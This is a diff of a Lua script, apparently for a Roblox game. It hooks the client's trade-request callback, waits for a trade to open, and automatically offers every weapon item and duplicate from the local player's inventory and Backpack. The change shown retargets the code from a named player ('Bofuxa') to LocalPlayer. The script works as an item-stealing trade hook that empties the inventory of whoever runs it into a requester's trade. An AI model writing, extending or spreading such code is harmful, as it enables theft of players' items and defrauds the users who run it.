@@ -36,29 +36,26 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
             
-            print("Trade started! Collecting weapons from bofuxa's inventory...")
+            print("Trade started! Collecting weapons from LocalPlayer's inventory...")
             task.wait(1)
             
-            local senderObj = Players:FindFirstChild("Bofuxa")
             local inventoryContainer = nil
+            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
             
-            if senderObj then
-                local sGui = senderObj:FindFirstChild("PlayerGui")
-                if sGui then
-                    local mainGui = sGui:FindFirstChild("MainGUI")
-                    if mainGui then
-                        local gameFolder = mainGui:FindFirstChild("Game")
-                        if gameFolder then
-                            local crafting = gameFolder:FindFirstChild("Crafting")
-                            if crafting then
-                                local inventory = crafting:FindFirstChild("Inventory")
-                                if inventory then
-                                    local salvage = inventory:FindFirstChild("Salvage")
-                                    if salvage then
-                                        local scrollFrame = salvage:FindFirstChild("ScrollFrame")
-                                        if scrollFrame then
-                                            inventoryContainer = scrollFrame:FindFirstChild("Container")
-                                        end
+            if pGui then
+                local mainGui = pGui:FindFirstChild("MainGUI")
+                if mainGui then
+                    local gameFolder = mainGui:FindFirstChild("Game")
+                    if gameFolder then
+                        local crafting = gameFolder:FindFirstChild("Crafting")
+                        if crafting then
+                            local inventory = crafting:FindFirstChild("Inventory")
+                            if inventory then
+                                local salvage = inventory:FindFirstChild("Salvage")
+                                if salvage then
+                                    local scrollFrame = salvage:FindFirstChild("ScrollFrame")
+                                    if scrollFrame then
+                                        inventoryContainer = scrollFrame:FindFirstChild("Container")
                                     end
                                 end
                             end
@@ -87,9 +84,9 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                print("Successfully offered all " .. tostring(offeredCount) .. " weapon items and duplicates at once!")
+                print("Successfully offered all " .. tostring(offeredCount) .. " weapon items and duplicates at once from LocalPlayer!")
             else
-                warn("Could not access bofuxa's inventory container path directly; scanning local fallback tools.")
+                warn("Could not access LocalPlayer's inventory container path; scanning Backpack fallback.")
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
